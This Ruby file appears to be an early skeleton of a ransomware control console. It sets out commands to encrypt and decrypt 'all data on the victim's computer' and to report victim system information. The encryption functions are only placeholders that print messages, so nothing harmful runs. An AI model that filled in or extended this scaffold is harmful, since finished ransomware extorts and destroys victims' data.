require 'cowsay'

def get_os_type
  case RUBY_PLATFORM
  when /linux/i
    'Linux'
  when /darwin/i
    'Mac OS'
  when /mswin|msys|mingw|cygwin|bccwin|wince|emc/i
    'Windows'
  else
    'Unknown'
  end
end

NB_CORES = Etc.nprocessors
NB_THREADS = NB_CORES * 2
OS_TYPE = get_os_type

COMMANDS = {"help" => "Usage: help [command]",
            "commands" => "Shows all commands",
            "enc" =>"Encrypt victim's data, by default it encrypts all data on the victim's computer\nUsage: encrypt [optional_path]",
            "dec" =>"Decrypt victim's data, by default it decrypts all data on the victim's computer\nUsage: decrypt [optional_path]",
            "health" => "Shows the ransomware's status",
            "info" => "Shows all system information gathered from victim's computer",
            "exit" => "Kills me ://"}


def help(command = "")
  if command == ""
    puts COMMANDS["help"]
  elsif !COMMANDS.has_key?(command)
    puts "Command not found, type 'commands' to see all commands"
  else
    puts COMMANDS[command]
  end
end

# help("enc")

def cmds
  COMMANDS.each do |key, value|
    puts "[*] #{key} - #{value}"
  end
end

def enc(path = "")
  if path == ""
    puts "Encrypting all files"
    # --> Insert encrypt all files function call here <--
  else
    puts "Encrypting #{path}"
    # --> Insert encryption function call here <--
  end
end

def dec(path = "")
  if path == ""
    puts "Decrypting all files"
    # --> Insert decrypt all files function call here <--
    else
  puts "Decrypting #{path}"
  # --> Insert decryption function call here <--
  end
end

def process_input(user_input)
  command = user_input.split[0]
  case command
  when "help"
    help(user_input.split[1] == nil ? "" : user_input.split[1])
  when "commands"
    cmds
  when "enc"
    enc(user_input.split[1])
  when "dec"
    dec(user_input.split[1])
  when "health"
    Cowsay.say("what it do baby boo", "cow")
  when "info"
    puts "OS: #{OS_TYPE}"
    puts "Number of cores: #{NB_CORES}"
    puts "Number of threads: #{NB_THREADS}"
  when "exit"
    exit
  else
    puts "Command not found, type 'commands' to see all commands"
  end
end

def main
  puts "ayoooo what it do baby boo"
while true
    user_input = gets.chomp
    process_input(user_input)
  end
end

main
